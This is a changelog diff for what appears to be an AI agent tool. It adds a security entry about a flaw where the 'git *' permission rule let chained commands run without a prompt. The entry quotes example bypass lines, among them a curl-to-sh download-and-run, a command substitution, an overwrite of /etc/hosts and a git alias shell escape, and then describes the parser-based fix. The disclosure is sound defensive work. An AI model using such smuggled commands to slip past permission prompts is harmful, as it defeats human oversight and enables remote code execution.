@@ -9,6 +9,8 @@ Versioning: [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
 ## [Unreleased]
 
+## [1.8.0] - 2026-10-15
+
 ### Security
 
 - **A permission rule on a shell command is compared with each command the line runs, not with the line as text.** The default rule `git *` was matched as a text pattern against the whole command line, so `*` also matched `;`, `&&`, `|`, `$(...)` and redirections. In the default mode, `git status; curl http://host/x | sh`, ``git status `touch /tmp/pwn` ``, `git status > /etc/hosts`, `git push origin main` and `git config --global alias.x '!...'` all ran without a prompt. Found by an audit and reproduced end to end with the default rules and the real `bash` tool. The line is now taken apart (`internal/shellparse`: quotes, escapes, `;`, `&&`, `||`, `|`, `&`, newlines, comments, command and process substitutions). An allow rule covers a line only when **every** simple command in it is matched by some allow rule and the line has no substitution, redirection, group or unterminated quote; a rule with no wildcard still covers its own exact text. A deny or ask rule applies as soon as any simple command in the line, or inside a substitution, matches, so `rm *` is caught in `ls; rm x` and in `echo $(rm x)`. The default allow rule is no longer `git *` but the read-only git commands (`status`, `log`, `diff`, `show`, `rev-parse`, `ls-files`, `blame`, `branch`, `remote -v`): `git add`, `git commit`, `git push` and the rest now ask, as every other command does. The same reading applies to `monitor`, whose second check runs without the `bash` tool.
